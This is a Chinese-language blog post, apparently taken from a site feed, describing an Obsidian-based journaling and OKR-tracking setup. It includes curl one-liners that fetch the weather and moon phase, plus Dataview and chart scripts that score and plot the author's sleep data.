title=\"结构\"></a>结构</h2><p>目录结构如日记图左侧栏所示</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></pre></td><td><pre><span>├── OKR.md</span><br><span>└── Journal</span><br><span>    └── 2022</span><br><span>        ├── W1</span><br><span>        |   └── 2022-01-01.md</span><br><span>        |   └── 2022-W1.md</span><br><span>        ├── 2022-01.md</span><br><span>        └── 2022.md</span><br></pre></td></tr></table></figure><p>每天会自动在本周的文件夹中生成当天的日记文件 <code>YYYY-MM-DD.md</code>，每周会自动新建一个周文件夹 <code>[W]ww</code> 和周记 <code>YYYY-[W]ww.md</code>，每月会自动生成月记 <code>YYYY-MM.md</code>，每年会自动新建一个年文件夹 <code>YYYY</code> 和年记 <code>YYYY.md</code>（更正：不是自动，仍然需要命令面板手动触发）</p><p>这些文件的内容也都是模板预设好的，已经自动填充了日期、本周期 OKR 分数和图表，甚至当天的位置、天气、月相等信息，还留出了记录当天状态和动态的位置</p><p>外面有一个 OKR 文件，大概半年更新一次，里面记录这半年的人生目标，其中有一些目标是需要每天持续努力的，日记系统的很大部分就是围绕这些目标来构建的</p><p>目录结构主要通过 <a href=\"https://github.com/liamcain/obsidian-periodic-notes\">Periodic Notes</a> 实现，模板主要通过 <a href=\"https://github.com/SilentVoid13/Templater\">Templater</a> 和 <a href=\"https://github.com/blacksmithgu/obsidian-dataview\">Dataview</a> 和核心插件 Templates 实现</p><h2><a href=\"https://diygod.me/#%E6%97%A5%E8%AE%B0\" title=\"日记\"></a>日记</h2><p><img src=\"https://diygod.me/images/obsidian-1.png\"></p><h3><a href=\"https://diygod.me/#Info\" title=\"Info\"></a>Info</h3><p>Info 是自动生成的当天信息，包括指向年月周记和 OKR 的链接，位置、天气、月相等信息</p><p>位置、天气、月相信息来自 Templater 的调用系统命令功能</p><p>获取位置和天气</p><figure><table><tr><td><pre><span>1</span><br></pre></td><td><pre><span>curl wttr.in/<span>\"<span>$(curl -s --header <span>\"user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\"</span> https://api.ip.sb/geoip | /opt/homebrew/bin/jq -r <span>\".city\"</span> | sed 's/ /%20/')</span>\"</span>\\?format=<span>\"%l+%c%t\"</span></span><br></pre></td></tr></table></figure><p>获取月相</p><figure><table><tr><td><pre><span>1</span><br></pre></td><td><pre><span>curl wttr.in/<span>\"<span>$(curl -s --header <span>\"user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\"</span> https://api.ip.sb/geoip | /opt/homebrew/bin/jq -r <span>\".city\"</span> | sed 's/ /%20/')</span>\"</span>\\?format=<span>\"%m\"</span></span><br></pre></td></tr></table></figure><h3><a href=\"https://diygod.me/#OKR-Tracker\" title=\"OKR Tracker\"></a>OKR Tracker</h3><p>OKR Tracke 跟踪记录当天当前阶段的 OKR 完成状况，比如 <code>Sleep:: 10.3</code> 代表今天睡了 10.3 小时，<code>Healthy Eating:: 5</code> 代表今天吃得很健康，<code>::</code> 是 Dataview 语法，会给当前页面增加</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span>page = {</span><br><span>    ...</span><br><span>    <span>\"Sleep\"</span>: <span>10.3</span>,</span><br><span>    <span>\"Healthy Eating\"</span>: <span>5</span>,</span><br><span>}</span><br></pre></td></tr></table></figure><p>这样的属性，方便接下来在周月年记中做分析和处理</p><p>其中 O1 KR2 下有一个特殊的列表，通过 API 展示了当天 Toggl Track 数据， Toggl Track 是一个时间记录应用，记录我每天在各项事务中花费的时间，比如看番时间、刷B站时间、工作时间等，这些数据同样可以反映我今天的生产力是否符合预期</p><h3><a href=\"https://diygod.me/#Notes\" title=\"Notes\"></a>Notes</h3><p>这里是真正写日记的地方，多数是一些流水账，来弥补我天生糟糕的记忆力，偶尔也会写一些想法</p><h2><a href=\"https://diygod.me/#%E5%91%A8%E8%AE%B0%E5%92%8C%E6%9C%88%E8%AE%B0\" title=\"周记和月记\"></a>周记和月记</h2><p><img src=\"https://diygod.me/images/obsidian-8.png\"></p><h3><a href=\"https://diygod.me/#Jornal-List\" title=\"Jornal List\"></a>Jornal List</h3><p>Jornal List 是自动生成的本周/月全部日记的列表，通过 Dataview 实现</p><p>获取全部日记</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>// Week</span></span><br><span><span>window</span>.<span>pages</span> = dv.<span>pages</span>(<span>`\"<span>${dv.current().file.folder}</span>\"`</span>).<span>where</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>.<span>match</span>(<span>new</span> <span>RegExp</span>(<span>`<span>${dv.current().file.name.split(<span>'-'</span>)[<span>0</span>]}</span>-\\\\d{2}-\\\\d{2}`</span>))).<span>sort</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>);</span><br><span></span><br><span><span>// Month</span></span><br><span><span>window</span>.<span>pages</span> = dv.<span>pages</span>().<span>where</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>.<span>match</span>(<span>new</span> <span>RegExp</span>(<span>`<span>${dv.current().file.name}</span>-\\\\d{2}`</span>))).<span>sort</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>);</span><br></pre></td></tr></table></figure><p>渲染列表</p><figure><table><tr><td><pre><span>1</span><br></pre></td><td><pre><span>dv.<span>paragraph</span>(<span>window</span>.<span>pages</span>.<span>file</span>.<span>link</span>.<span>join</span>(<span>', '</span>))</span><br></pre></td></tr></table></figure><h3><a href=\"https://diygod.me/#Summary\" title=\"Summary\"></a>Summary</h3><p>这里是月末做总结和反思的地方，对应日记里的 Notes</p><h3><a href=\"https://diygod.me/#OKR-Tracker-1\" title=\"OKR Tracker\"></a>OKR Tracker</h3><p>在这里处理和分析全部日记里的 OKR 数据，最后生成分数，对应日记里的 OKR Tracker</p><p>它通过 Dataview 实现，以睡眠为例，≥ 6.5 小时且 ≤ 8.5 小时计为有效睡眠，有效睡眠天数占总天数的百分比即为得分</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></pre></td><td><pre><span><span>let</span> count = <span>0</span>;</span><br><span><span>let</span> total = <span>0</span>;</span><br><span><span>for</span> (<span>let</span> page <span>of</span> <span>window</span>.<span>pages</span>) {</span><br><span>    <span>if</span> (page[<span>'Sleep'</span>]) {</span><br><span>        count++;</span><br><span>        <span>if</span> (page[<span>'Sleep'</span>] &gt;= <span>6.5</span> &amp;&amp; page[<span>'Sleep'</span>] &lt;= <span>8.5</span>) {</span><br><span>            total++;</span><br><span>        }</span><br><span>    }</span><br><span>}</span><br><span><span>const</span> score = (total / count * <span>100</span>).<span>toFixed</span>(<span>2</span>);</span><br><span>dv.<span>el</span>(<span>'div'</span>, score + <span>'%'</span>, {</span><br><span>    <span>cls</span>: score &gt; <span>80</span> ? <span>'score-class1'</span> : score &gt; <span>50</span> ? <span>'score-class2'</span> : <span>'score-class3'</span></span><br><span>});</span><br></pre></td></tr></table></figure><p>再自己加一点 CSS，&gt; 80 分显示为绿色，50-80 分显示为黄色，&lt; 50 分显示为红色，这样就可以很清楚看出本周/月的睡觉情况，图里是黄色区间，不太好但还可以接受，下个月需要多留意</p><h3><a href=\"https://diygod.me/#Statistics\" title=\"Statistics\"></a>Statistics</h3><p>在这里把睡眠和运动数据生成统计图，可以清楚看出睡眠时长还是挺不稳定的，运动天数和时长都很少</p><p>统计图通过 <a href=\"https://github.com/phibr0/obsidian-charts\">Obsidian Charts</a> 绘制，睡眠统计图代码如下</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></pre></td><td><pre><span><span>const</span> times = [];</span><br><span><span>for</span> (<span>let</span> page <span>of</span> <span>window</span>.<span>pages</span>) {</span><br><span>    times.<span>push</span>(page[<span>'Sleep'</span>]);</span><br><span>}</span><br><span></span><br><span><span>const</span> chartData = {</span><br><span>    <span>type</span>: <span>'line'</span>,</span><br><span>    <span>data</span>: {</span><br><span>        <span>labels</span>: <span>window</span>.<span>pages</span>.<span>file</span>.<span>name</span>.<span>array</span>(),</span><br><span>        <span>datasets</span>: [{</span><br><span>            <span>label</span>: <span>'Sleep Time'</span>,</span><br><span>            <span>data</span>: times,</span><br><span>            <span>pointBackgroundColor</span>: <span>'#6c40d6'</span>,</span><br><span>            <span>borderColor</span>: <span>'#6c40d65c'</span>,</span><br><span>            <span>tension</span>: <span>0.4</span>,</span><br><span>            <span>spanGaps</span>: <span>true</span>,</span><br><span>        }],</span><br><span>    },</span><br><span>    <span>options</span>: {</span><br><span>        <span>scales</span>: {</span><br><span>            <span>y</span>: {</span><br><span>                <span>type</span>: <span>'linear'</span>,</span><br><span>                <span>min</span>: <span>2</span>,</span><br><span>                <span>max</span>: <span>13</span></span><br><span>            }</span><br><span>        }</span><br><span>    }</span><br><span>}</span><br><span></span><br><span><span>window</span>.<span>renderChart</span>(chartData, <span>this</span>.<span>container</span>);</span><br></pre></td></tr></table></figure><h3><a href=\"https://diygod.me/#Finance\" title=\"Finance\"></a>Finance</h3><p>本月的财务数据饼状图，通过 MoneyWiz 生成</p><h2><a href=\"https://diygod.me/#%E5%B9%B4%E8%AE%B0\" title=\"年记\"></a>年记</h2><p><img src=\"https://diygod.me/images/obsidian-9.png\"></p><p>年记与周记月记相似度也很高，但通过扩大时间尺度，可以得出很多新的有用结论</p><p>比如同样的睡眠和运动统计图，在年的尺度里就可以看出我是在 5 月底睡眠开始失控，在这期间运动也中断了，又从 6 月中旬得到缓解</p><p>还有新的体重体脂统计图，可以看出我的体重和体脂都在稳步下降，健康状况有明显改善</p><p>年记还出现了新的一种热图，记录达到目标的日子，通过 <a href=\"https://github.com/Richardsl/heatmap-calendar-obsidian\">Heatmap Calendar</a> 绘制，以睡眠为例</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></pre></td><td><pre><span><span>const</span> calendarData = { </span><br><span>    <span>entries</span>: [],</span><br><span>}</span><br><span></span><br><span><span>const</span> pages = <span>window</span>.<span>pages</span></span><br><span>    .<span>where</span>(<span><span>p</span> =&gt;</span> p.<span>Sleep</span> &amp;&amp; p.<span>Sleep</span> &gt;= <span>6.5</span> &amp;&amp; p.<span>Sleep</span> &lt;= <span>8.5</span>)</span><br><span>    .<span>sort</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>);</span><br><span></span><br><span><span>for</span>(<span>let</span> page <span>of</span> pages){ </span><br><span>    calendarData.<span>entries</span>.<span>push</span>({</span><br><span>        <span>date</span>: page.<span>file</span>.<span>name</span>,</span><br><span>        <span>intensity</span>: page.<span>Sleep</span>,</span><br><span>    })</span><br><span>}</span><br><span></span><br><span><span>renderHeatmapCalendar</span>(<span>this</span>.<span>container</span>, calendarData);</span><br></pre></td></tr></table></figure><h2><a href=\"https://diygod.me/#%E5%B1%80%E9%99%90\" title=\"局限\"></a>局限</h2><p>子弹笔记有一个很重要的任务清单模块，如上面子弹笔记截图所示，我之前会把一周的任务清单都提前写在笔记里，但现在日记都是当天自动生成，无法提前计划，所以我把任务清单都改用了滴答清单来管理，滴答清单当然也很好用，但是这样就少了与日记的联动，手动添加又会造成很多重复工作，就不是很爽</p><p>最后需要注意的是，即使有这样的生活管理系统也不意味着生活就会一切按照预期，就像上面举例的 5 月底睡眠失控事件，一旦放松失控仍会发生，笔记会告诉我生活正在失控，但如何回到正轨和追赶上 OKR 还是要靠自控力和坚持的定期总结、反思和改进</p>"
    },
    "origin": {
        "streamId": 11,
        "title": "Hi, DIYgod",
        "htmlUrl": "https://diygod.me/",
        "feedUrl": "https://diygod.me/atom.xml"
    }
}
]}
